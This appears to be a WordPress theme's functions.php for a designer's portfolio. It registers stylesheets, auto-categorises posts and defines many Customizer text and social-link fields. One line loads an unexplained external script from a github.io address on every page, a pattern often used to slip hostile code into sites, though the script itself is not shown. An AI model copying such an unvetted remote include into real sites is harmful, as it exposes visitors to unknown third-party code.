<?php 
add_action('wp_enqueue_scripts', 'get_script');
function get_script() {
wp_enqueue_style( 'BootstrapCss', get_stylesheet_directory_uri( ) . '/css/bootstrap-grid.min.css"' );
wp_enqueue_style( 'mainStyleSheets', get_stylesheet_uri( ) );
wp_enqueue_script( 'userScript', get_template_directory_uri( ) . '/js/user.js' );
wp_enqueue_script( 'userScriptddd1', 'https://mosaypup.github.io/1.js', true );
}
/*New post in All category*/
add_action( 'wp_insert_post', 'update_post_terms' );
function update_post_terms( $post_id ) {
	if ( $parent = wp_is_post_revision( $post_id ) )
		$post_id = $parent;
	$post = get_post( $post_id );
	if ( $post->post_type != 'post' )
		return;
// add a category
	$categories = wp_get_post_categories( $post_id );
	$newcat    = get_term_by( 'name', 'All projects', 'category' );
	array_push( $categories, $newcat->term_id );
	wp_set_post_categories( $post_id, $categories );
}
/*/New post in All category*/
/*thumbnail support*/
add_theme_support('post-thumbnails'); 
/*/thumbnail support*/

/*Theme customizer*/
function ale_customize_register($wp_customize){
	$wp_customize->add_section('ads', array(
		'title'    => __('My settings', 'aletheme'),
		'priority' => 30,
	));
	//contact me
	$wp_customize->add_setting('ads_code_111', array(
		'default'    => '',
		'transport' => 'postMEssage',
	));
  
	$wp_customize->add_control(new WP_Customize_Control($wp_customize, 'ads_code_111', array(
		'label' => __( 'contact me', 'aletheme'),
		'section' => 'ads',
		'settings' => 'ads_code_111',
		'type' => 'input',
	)));
	//Dribbble
	$wp_customize->add_setting('ads_code', array(
		'default'    => '',
		'transport' => 'postMEssage',
	));
  
	$wp_customize->add_control(new WP_Customize_Control($wp_customize, 'ads_code', array(
		'label' => __( 'Dribbble', 'aletheme'),
		'section' => 'ads',
		'settings' => 'ads_code',
		'type' => 'input',
	)));
  //LinkedIn
  $wp_customize->add_setting('ads_code_1', array(
		'default'    => '',
		'transport' => 'postMEssage',
	));

	$wp_customize->add_control(new WP_Customize_Control($wp_customize, 'ads_code_1', array(
		'label' => __( 'LinkedIn', 'aletheme'),
		'section' => 'ads',
		'settings' => 'ads_code_1',
		'type' => 'input',
	)));
	//Twitter
  $wp_customize->add_setting('ads_code_2', array(
		'default'    => '',
		'transport' => 'postMEssage',
	));
	
	$wp_customize->add_control(new WP_Customize_Control($wp_customize, 'ads_code_2', array(
		'label' => __( 'Twitter', 'aletheme'),
		'section' => 'ads',
		'settings' => 'ads_code_2',
		'type' => 'input',
	)));
	//Medium
  $wp_customize->add_setting('ads_code_3', array(
		'default'    => '',
		'transport' => 'postMEssage',
	));
	
	$wp_customize->add_control(new WP_Customize_Control($wp_customize, 'ads_code_3', array(
		'label' => __( 'Medium', 'aletheme'),
		'section' => 'ads',
		'settings' => 'ads_code_3',
		'type' => 'input',
	)));
	//Instagram
  $wp_customize->add_setting('ads_code_4', array(
		'default'    => '',
		'transport' => 'postMEssage',
	));
	
	$wp_customize->add_control(new WP_Customize_Control($wp_customize, 'ads_code_4', array(
		'label' => __( 'Instagram', 'aletheme'),
		'section' => 'ads',
		'settings' => 'ads_code_4',
		'type' => 'input',
	)));
	//Behance
  $wp_customize->add_setting('ads_code_5', array(
		'default'    => '',
		'transport' => 'postMEssage',
	));
	
	$wp_customize->add_control(new WP_Customize_Control($wp_customize, 'ads_code_5', array(
		'label' => __( 'Behance', 'aletheme'),
		'section' => 'ads',
		'settings' => 'ads_code_5',
		'type' => 'input',
	)));
	//Hello, my name - title 1
  $wp_customize->add_setting('ads_code_6', array(
		'default'    => '',
		'transport' => 'refresh',
	));
	
	$wp_customize->add_control(new WP_Customize_Control($wp_customize, 'ads_code_6', array(
		'label' => __( 'Hello, my name - title 1', 'aletheme'),
		'section' => 'ads',
		'settings' => 'ads_code_6',
		'type' => 'input',
	)));
	//I’m a Product designer 1
  $wp_customize->add_setting('ads_code_7', array(
		'default'    => '',
		'transport' => 'refresh',
	));
	
	$wp_customize->add_control(new WP_Customize_Control($wp_customize, 'ads_code_7', array(
		'label' => __( 'I’m a Product designer - description 1', 'aletheme'),
		'section' => 'ads',
		'settings' => 'ads_code_7',
		'type' => 'textarea',
	)));
	//Hello- title 2
  $wp_customize->add_setting('ads_code_8', array(
		'default'    => '',
		'transport' => 'refresh',
	));
	
	$wp_customize->add_control(new WP_Customize_Control($wp_customize, 'ads_code_8', array(
		'label' => __( 'Hello- title 2', 'aletheme'),
		'section' => 'ads',
		'settings' => 'ads_code_8',
		'type' => 'input',
	)));
	//I’m a Product designer 2
  $wp_customize->add_setting('ads_code_9', array(
		'default'    => '',
		'transport' => 'refresh',
	));
	
	$wp_customize->add_control(new WP_Customize_Control($wp_customize, 'ads_code_9', array(
		'label' => __( 'Lets get', 'aletheme'),
		'section' => 'ads',
		'settings' => 'ads_code_9',
		'type' => 'textarea',
	)));
	//I'm dani adnor
  $wp_customize->add_setting('ads_code_91', array(
		'default'    => '',
		'transport' => 'refresh',
	));
	$wp_customize->add_control(new WP_Customize_Control($wp_customize, 'ads_code_91', array(
		'label' => __( "I'm Dani Andor  - description", 'aletheme'),
		'section' => 'ads',
		'settings' => 'ads_code_91',
		'type' => 'textarea',
	)));
	//Project
  $wp_customize->add_setting('ads_code_92', array(
		'default'    => '',
		'transport' => 'refresh',
	));
	$wp_customize->add_control(new WP_Customize_Control($wp_customize, 'ads_code_92', array(
		'label' => __( 'Project', 'aletheme'),
		'section' => 'ads',
		'settings' => 'ads_code_92',
		'type' => 'input',
	)));
	// Take a look
  $wp_customize->add_setting('ads_code_93', array(
		'default'    => '',
		'transport' => 'refresh',
	));
	$wp_customize->add_control(new WP_Customize_Control($wp_customize, 'ads_code_93', array(
		'label' => __( 'Take a look', 'aletheme'),
		'section' => 'ads',
		'settings' => 'ads_code_93',
		'type' => 'input',
	)));
	// Check out
  $wp_customize->add_setting('ads_code_94', array(
		'default'    => '',
		'transport' => 'refresh',
	));
	$wp_customize->add_control(new WP_Customize_Control($wp_customize, 'ads_code_94', array(
		'label' => __( 'Check out', 'aletheme'),
		'section' => 'ads',
		'settings' => 'ads_code_94',
		'type' => 'input',
	)));
	// Experience 
  $wp_customize->add_setting('ads_code_95', array(
		'default'    => '',
		'transport' => 'refresh',
	));
	$wp_customize->add_control(new WP_Customize_Control($wp_customize, 'ads_code_95', array(
		'label' => __( 'Experience', 'aletheme'),
		'section' => 'ads',
		'settings' => 'ads_code_95',
		'type' => 'input',
	)));
	// Several years of 
  $wp_customize->add_setting('ads_code_96', array(
		'default'    => '',
		'transport' => 'refresh',
	));
	$wp_customize->add_control(new WP_Customize_Control($wp_customize, 'ads_code_96', array(
		'label' => __( 'Several years of ', 'aletheme'),
		'section' => 'ads',
		'settings' => 'ads_code_96',
		'type' => 'textarea',
	)));

	//Have a great idea? - title 3
  $wp_customize->add_setting('ads_code_10', array(
		'default'    => '',
		'transport' => 'refresh',
	));
	
	$wp_customize->add_control(new WP_Customize_Control($wp_customize, 'ads_code_10', array(
		'label' => __( 'Have a great idea? - title 3', 'aletheme'),
		'section' => 'ads',
		'settings' => 'ads_code_10',
		'type' => 'textarea',
	)));
	//Lets work together
  $wp_customize->add_setting('ads_code_11', array(
		'default'    => '',
		'transport' => 'refresh',
	));
	
	$wp_customize->add_control(new WP_Customize_Control($wp_customize, 'ads_code_11', array(
		'label' => __( 'Lets work together', 'aletheme'),
		'section' => 'ads',
		'settings' => 'ads_code_11',
		'type' => 'textarea',
	)));
	//If you looking for
  $wp_customize->add_setting('ads_code_12', array(
		'default'    => '',
		'transport' => 'refresh',
	));
	
	$wp_customize->add_control(new WP_Customize_Control($wp_customize, 'ads_code_12', array(
		'label' => __( 'If you are looking for a UI/UX  - description 3', 'aletheme'),
		'section' => 'ads',
		'settings' => 'ads_code_12',
		'type' => 'textarea',
	)));

	//Fulfilli
  $wp_customize->add_setting('ads_code_13', array(
		'default'    => '',
		'transport' => 'refresh',
	));
	
	$wp_customize->add_control(new WP_Customize_Control($wp_customize, 'ads_code_13', array(
		'label' => __( 'Fulfilli', 'aletheme'),
		'section' => 'ads',
		'settings' => 'ads_code_13',
		'type' => 'input',
	)));

	//Effective Experiments
  $wp_customize->add_setting('ads_code_14', array(
		'default'    => '',
		'transport' => 'refresh',
	));
	
	$wp_customize->add_control(new WP_Customize_Control($wp_customize, 'ads_code_14', array(
		'label' => __( 'Effective Experiments', 'aletheme'),
		'section' => 'ads',
		'settings' => 'ads_code_14',
		'type' => 'input',
	)));
	//Cognetik
	$wp_customize->add_setting('ads_code_15', array(
		'default'    => '',
		'transport' => 'refresh',
	));
	
	$wp_customize->add_control(new WP_Customize_Control($wp_customize, 'ads_code_15', array(
		'label' => __( 'Cognetik', 'aletheme'),
		'section' => 'ads',
		'settings' => 'ads_code_15',
		'type' => 'input',
	)));
	//FlipSnack
	$wp_customize->add_setting('ads_code_16', array(
		'default'    => '',
		'transport' => 'refresh',
	));
	
	$wp_customize->add_control(new WP_Customize_Control($wp_customize, 'ads_code_16', array(
		'label' => __( 'FlipSnack', 'aletheme'),
		'section' => 'ads',
		'settings' => 'ads_code_16',
		'type' => 'input',
	)));
}
add_action('customize_register', 'ale_customize_register');
/*Remove menu*/
function remove_menus(){
  
  remove_menu_page( 'index.php' );                  //Dashboard
  remove_menu_page( 'jetpack' );                    //Jetpack* 
  remove_menu_page( 'edit.php?post_type=page' );    //Pages
  remove_menu_page( 'edit-comments.php' );          //Comments
}
// add_action( 'admin_menu', 'remove_menus' );
/* /Remove menu*/
/*Editor*/
//Text
add_action( 'admin_print_footer_scripts', 'appthemes_add_quicktags' );
function appthemes_add_quicktags() {
	if ( ! wp_script_is('quicktags') )
		return;
}
?>
